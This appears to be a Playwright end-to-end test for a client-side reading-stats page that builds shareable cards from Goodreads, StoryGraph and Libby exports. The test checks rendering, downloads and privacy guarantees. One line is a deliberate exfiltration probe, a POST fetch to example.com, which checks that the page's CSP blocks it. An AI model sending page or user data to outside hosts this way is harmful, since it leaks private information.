// Playwright end-to-end test for docs/reading/ (Reading Wrapped).
// Run: NODE_PATH=/opt/npm-tools/node_modules node bots/reading/test_page.js <screenshot dir>
// Uses only synthetic fixtures. Kit is routed to a local stub; the real API is never hit.
const { chromium } = require('playwright');
const JSZip = require(require('path').resolve(__dirname, '../../docs/reading/vendor/jszip-3.10.1.min.js'));
const http = require('http'), fs = require('fs'), path = require('path');

const ROOT = path.resolve(__dirname, '../../docs');
const FX = path.join(__dirname, 'fixtures');
const OUT = path.resolve(process.argv[2] || '.');
fs.mkdirSync(OUT, { recursive: true });
const PORT = 8768, ORIGIN = 'http://127.0.0.1:' + PORT;
const TYPES = { '.html': 'text/html', '.js': 'application/javascript', '.json': 'application/json', '.png': 'image/png', '.css': 'text/css', '.md': 'text/plain' };
const server = http.createServer((req, res) => {
  let p = decodeURIComponent(req.url.split('?')[0]); if (p.endsWith('/')) p += 'index.html';
  fs.readFile(path.join(ROOT, p), (e, b) => {
    if (e) { res.writeHead(404); res.end(); return; }
    res.writeHead(200, { 'Content-Type': TYPES[path.extname(p)] || 'application/octet-stream' }); res.end(b);
  });
}).listen(PORT);

let fails = 0;
const check = (c, m) => { console.log((c ? '  ok   ' : '  FAIL ') + m); if (!c) fails++; };

async function cardInfo(page) {
  return page.evaluate(() => [...document.querySelectorAll('#deck canvas')].map((c) => {
    const d = c.getContext('2d').getImageData(0, 0, c.width, c.height).data;
    let min = 765, max = 0, sum = 0;
    for (let i = 0; i < d.length; i += 4 * 997) { const v = d[i] + d[i + 1] + d[i + 2]; min = Math.min(min, v); max = Math.max(max, v); sum = (sum * 31 + v) >>> 0; }
    return { w: c.width, h: c.height, spread: max - min, hash: sum, label: c.getAttribute('aria-label') };
  }));
}

async function upload(page, file) {
  await page.evaluate(() => { document.querySelector('#deck').innerHTML = ''; document.querySelector('#file').value = ''; });
  await page.setInputFiles('#file', path.join(FX, file));
  await page.waitForFunction(() => document.querySelectorAll('#deck canvas').length > 0, null, { timeout: 30000 });
  return cardInfo(page);
}

async function expectError(page, file, re) {
  await page.setInputFiles('#file', path.join(FX, file));
  await page.waitForFunction(() => document.querySelector('#status').classList.contains('err'));
  return re.test(await page.textContent('#status'));
}

(async () => {
  const browser = await chromium.launch();
  for (const width of [390, 1280]) {
    console.log(`\n== ${width}px ==`);
    const ctx = await browser.newContext({ viewport: { width, height: 900 }, acceptDownloads: true });
    const page = await ctx.newPage();
    await page.clock.install({ time: new Date('2026-11-14T12:00:00') });
    const errs = []; page.on('pageerror', (e) => errs.push(String(e))); page.on('console', (m) => { if (m.type() === 'error') errs.push(m.text()); });

    // Record every request. Anything off-origin is aborted.
    const all = [], offOrigin = [];
    await ctx.route('**/*', (route) => {
      const r = route.request();
      all.push({ url: r.url(), method: r.method() });
      if (!r.url().startsWith(ORIGIN + '/')) { offOrigin.push(r.url()); return route.abort(); }
      return route.continue();
    });

    await page.goto(ORIGIN + '/reading/');
    await page.waitForLoadState('networkidle');
    check(offOrigin.length === 0, `page load makes no off-origin requests (${offOrigin.join(', ') || 'none'})`);
    check(/Your library never leaves your device\./.test(await page.textContent('#privacy-badge')), 'privacy promise visible');
    check(/Not affiliated with Goodreads, StoryGraph, Libby or OverDrive/.test(await page.textContent('footer')), 'footer disclaimer present');
    check(await page.locator('footer a[href="../guides/how-to-export-libby-timeline.html"]').count() === 1 && await page.locator('#libby').count() === 1, 'Libby export steps + guide link on the page');
    check(await page.locator('footer a[href="../"]').count() === 1, 'footer links to ../');
    const csp = await page.getAttribute('meta[http-equiv="Content-Security-Policy"]', 'content');
    check(csp === "default-src 'none'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; connect-src https://api.convertkit.com; base-uri 'none'; form-action 'none'; object-src 'none'", 'CSP unchanged: scripts self-only, connections to Kit only');
    check(/goodreads wrapped/i.test(await page.title()) && /reading wrapped 2026/i.test(await page.title()), 'SEO title targets "goodreads wrapped" / "reading wrapped 2026"');
    check(/storygraph/i.test(await page.getAttribute('meta[name="description"]', 'content')), 'meta description mentions StoryGraph');
    check(/og\.png$/.test(await page.getAttribute('meta[property="og:image"]', 'content')), 'OG image set');
    const loadCount = all.length;

    // Goodreads CSV
    let cards = await upload(page, 'goodreads_library_export.csv');
    check(cards.length >= 8 && cards.length <= 10, `Goodreads CSV -> ${cards.length} cards`);
    check(cards.every((c) => c.w === 1080 && c.h === 1920), 'every card is 1080x1920');
    check(cards.every((c) => c.spread > 200), 'every card has rendered content (not blank)');
    check((await page.inputValue('#year')) === '2026', 'year selector defaults to the current year (2026)');
    check(await page.isHidden('#undated-wrap'), 'undated-books checkbox hidden when every read book has a date');
    const opts = await page.$$eval('#year option', (o) => o.map((x) => x.value));
    check(JSON.stringify(opts) === '["2026","2025","2024","all"]', `year options ${opts.join(',')}`);
    const h0 = cards[0].hash;
    await page.selectOption('#year', '2025');
    let c2 = await cardInfo(page);
    check(c2.length >= 8 && c2[0].hash !== h0, `2025 re-renders (${c2.length} cards)`);
    await page.selectOption('#year', 'all');
    c2 = await cardInfo(page);
    check(c2.length >= 8 && c2.every((c) => c.spread > 200), `all time renders (${c2.length} cards)`);
    await page.selectOption('#year', '2026');
    await page.fill('#name-input', 'Sam');
    await page.waitForTimeout(450);
    c2 = await cardInfo(page);
    check(c2[0].hash !== h0, 'name on cards re-renders');
    check(await page.evaluate(() => document.documentElement.scrollWidth <= window.innerWidth), 'no horizontal page scroll');
    await page.screenshot({ path: path.join(OUT, `page-${width}-goodreads.png`), fullPage: width === 1280 });
    if (width === 390) await page.locator('#deck').screenshot({ path: path.join(OUT, `deck-${width}.png`) });

    // Save one PNG and the zip.
    const [dl1] = await Promise.all([page.waitForEvent('download'), page.click('#deck figure:first-child button:has-text("Save PNG")')]);
    const p1 = await dl1.path();
    check(/^reading-wrapped-2026-01-.*\.png$/.test(dl1.suggestedFilename()) && fs.statSync(p1).size > 50000, `Save PNG -> ${dl1.suggestedFilename()} (${fs.statSync(p1).size} bytes)`);
    const [dlz] = await Promise.all([page.waitForEvent('download'), page.click('#zip-all')]);
    const z = await JSZip.loadAsync(fs.readFileSync(await dlz.path()));
    check(Object.keys(z.files).length === cards.length, `zip has ${Object.keys(z.files).length} PNGs`);

    // Zipped export, StoryGraph, oddities, tiny.
    cards = await upload(page, 'goodreads_export.zip');
    check(cards.length >= 8, `Goodreads .zip -> ${cards.length} cards`);
    cards = await upload(page, 'storygraph_export.csv');
    const labels = cards.map((c) => c.label).join(' | ');
    check(cards.length >= 8 && cards.length <= 10 && cards.every((c) => c.spread > 200), `StoryGraph CSV -> ${cards.length} cards`);
    check(!/Pages read/.test(labels) && /Mood mix|Genre mix/.test(labels), 'StoryGraph deck skips pages, keeps a mix card');
    await page.screenshot({ path: path.join(OUT, `page-${width}-storygraph.png`) });
    cards = await upload(page, 'storygraph_odd.csv');
    check(cards.length >= 3, `StoryGraph odd -> ${cards.length} cards`);
    cards = await upload(page, 'goodreads_odd.csv');
    check(cards.length >= 5, `Goodreads odd -> ${cards.length} cards`);
    check(!(await page.isHidden('#undated-wrap')), 'undated-books checkbox shown when some read books have no date');
    const before = await page.$eval('#year option[value="2026"]', (o) => o.textContent);
    await page.check('#undated');
    await page.waitForTimeout(150);
    const after = await page.$eval('#year option[value="2026"]', (o) => o.textContent);
    check(before !== after, `ticking it counts undated books (${before} -> ${after})`);
    cards = await upload(page, 'goodreads_excel_semicolon.csv');
    check(cards.length >= 3, `spreadsheet re-save -> ${cards.length} cards`);
    cards = await upload(page, 'tiny_goodreads.csv');
    check(cards.length >= 3 && cards.every((c) => c.spread > 200), `tiny library -> ${cards.length} cards`);
    // Libby: spreadsheet, JSON, zipped JSON, oddities.
    cards = await upload(page, 'libbytimeline-activities.csv');
    let lab = cards.map((c) => c.label).join(' | ');
    check(cards.length >= 4 && cards.every((c) => c.spread > 200), `Libby CSV -> ${cards.length} cards (${lab})`);
    check(/Library love/.test(lab) && !/Pages read|Top-rated|longest|Harsh|Easy grader|Fair judge|How you rate|How you read/.test(lab), 'Libby deck has Library love and skips pages, ratings and formats cards');
    check(/Libby timeline/.test(await page.textContent('#status')) && /returned, so counted as read/.test(await page.textContent('#status')), 'status explains Libby counting');
    check((await page.inputValue('#year')) === '2026', 'Libby year defaults to 2026');
    check(!(await page.isHidden('#undated-wrap')) && /ended without a "Returned" entry/.test(await page.textContent('#undated-label')), 'Libby: expired-loan checkbox shown with Libby wording');
    const lb0 = await page.$eval('#year option[value="2026"]', (o) => o.textContent);
    await page.check('#undated'); await page.waitForTimeout(150);
    check(lb0 !== await page.$eval('#year option[value="2026"]', (o) => o.textContent), 'ticking it counts expired loans');
    await page.screenshot({ path: path.join(OUT, `page-${width}-libby.png`) });
    const lbj = await upload(page, 'libbytimeline-activities.json');
    check(lbj.length === cards.length && /Library love/.test(lbj.map((c) => c.label).join()), `Libby JSON -> ${lbj.length} cards`);
    check((await upload(page, 'libby_export.zip')).length === cards.length, 'Libby JSON inside a .zip');
    cards = await upload(page, 'libby_odd.csv');
    check(cards.length >= 3 && cards.every((c) => c.spread > 200), `Libby odd -> ${cards.length} cards`);
    await page.selectOption('#year', 'all');
    c2 = await cardInfo(page);
    check(c2.length >= 3 && c2.every((c) => c.spread > 200), `Libby all time renders (${c2.length} cards)`);
    check(await expectError(page, 'not_libby.json', /doesn.t look like a Libby timeline/), 'non-Libby JSON shows a clear error');
    check(await expectError(page, 'libby_empty.csv', /no loans/), 'empty Libby timeline shows a clear error');
    check(await expectError(page, 'not_an_export.csv', /doesn.t look like a Goodreads, StoryGraph or Libby export/), 'non-export CSV shows a clear error');
    check(await expectError(page, 'empty_goodreads.csv', /no books/), 'empty export shows a clear error');

    // The core privacy assertion: after page load, uploading and rendering made zero network requests.
    // The static "More free apps" strip (../apps/more.js, more.css, lazy thumbnails) may load after upload; it sends no data.
    const afterUpload = all.slice(loadCount).filter((r) => !(r.method === 'GET' && /^\/apps\/(more\.(js|css)|img\/[a-z-]+\.jpg)$/.test(r.url.replace(ORIGIN, ''))));
    check(afterUpload.length === 0 && offOrigin.length === 0, `zero network requests after upload (${afterUpload.length} made: ${afterUpload.map((r) => r.method + ' ' + r.url).join(', ') || 'none'})`);

    // CSP really blocks an exfiltration attempt from page context.
    const blocked = await page.evaluate(() => fetch('https://example.com/x', { method: 'POST', body: 'test' }).then(() => false, () => true));
    check(blocked, 'CSP blocks fetch to a third-party origin');

    // Kit signup sends only the email (library still loaded on the page).
    const kit = [];
    await ctx.unroute('**/*');
    await page.route(/convertkit\.com|kit\.com/, async (route) => {
      kit.push({ url: route.request().url(), body: route.request().postData() || '' });
      await route.fulfill({ status: 200, contentType: 'application/json', headers: { 'Access-Control-Allow-Origin': '*' }, body: '{"subscription":{"id":1}}' });
    });
    await upload(page, 'goodreads_library_export.csv');
    await page.fill('#signup-email', 'test@example.com');
    await page.click('#signup-form button');
    await page.waitForFunction(() => /on the list|didn't go through/.test(document.querySelector('#notify').textContent));
    const body = kit[0] ? JSON.parse(kit[0].body) : {};
    check(kit.length === 1 && /\/v3\/tags\/25879339\/subscribe$/.test(kit[0].url), 'Kit called once with 25879339');
    check(JSON.stringify(Object.keys(body).sort()) === '["api_key","email"]' && !/Imogen|Velvet|Cartographer|fantasy/.test(kit[0].body), 'Kit body has only api_key + email (no library data)');

    // Sample button.
    await page.click('#reset');
    await page.click('#sample');
    await page.waitForFunction(() => document.querySelectorAll('#deck canvas').length >= 8);
    check(true, 'sample library renders');
    const realErrs = errs.filter((e) => !/example\.com\/x/.test(e)); // the deliberate CSP probe above
    check(realErrs.length === 0, `no page errors (${realErrs.join(' | ') || 'none'})`);
    await ctx.close();
  }

  // New year with nothing read yet: falls back to the latest year with books; picking the empty year explains itself.
  {
    console.log('\n== January 2027 ==');
    const ctx = await browser.newContext({ viewport: { width: 390, height: 900 } });
    const page = await ctx.newPage();
    await page.clock.install({ time: new Date('2027-01-05T12:00:00') });
    await page.goto(ORIGIN + '/reading/');
    await upload(page, 'goodreads_library_export.csv');
    check((await page.inputValue('#year')) === '2026', 'falls back to 2026 when 2027 has no books yet');
    check(/No finished books in 2027 yet/.test(await page.textContent('#status')), 'status explains the fallback');
    await page.selectOption('#year', '2027');
    await page.waitForFunction(() => !document.querySelector('#empty').hidden);
    check((await page.$$('#deck canvas')).length === 0 && /No finished books in 2027/.test(await page.textContent('#empty')), 'empty year shows a message, no cards');
    await ctx.close();
  }

  // Export every card as PNGs for visual review.
  const ctx = await browser.newContext({ viewport: { width: 1280, height: 900 } });
  const page = await ctx.newPage();
  await page.clock.install({ time: new Date('2026-11-14T12:00:00') });
  await page.goto(ORIGIN + '/reading/');
  for (const [fx, tag, year] of [['goodreads_library_export.csv', 'goodreads'], ['storygraph_export.csv', 'storygraph'], ['libbytimeline-activities.csv', 'libby'], ['libbytimeline-activities.csv', 'libby-all', 'all'], ['libby_odd.csv', 'libby-odd']]) {
    await upload(page, fx);
    if (year) { await page.selectOption('#year', year); await page.waitForTimeout(200); }
    const urls = await page.evaluate(() => [...document.querySelectorAll('#deck canvas')].map((c) => c.toDataURL('image/png')));
    urls.forEach((u, i) => fs.writeFileSync(path.join(OUT, `card-${tag}-${String(i + 1).padStart(2, '0')}.png`), Buffer.from(u.split(',')[1], 'base64')));
  }
  await browser.close(); server.close();
  console.log(fails ? `\n${fails} FAILED` : '\nALL PASSED');
  process.exit(fails ? 1 : 0);
})().catch((e) => { console.error(e); process.exit(1); });
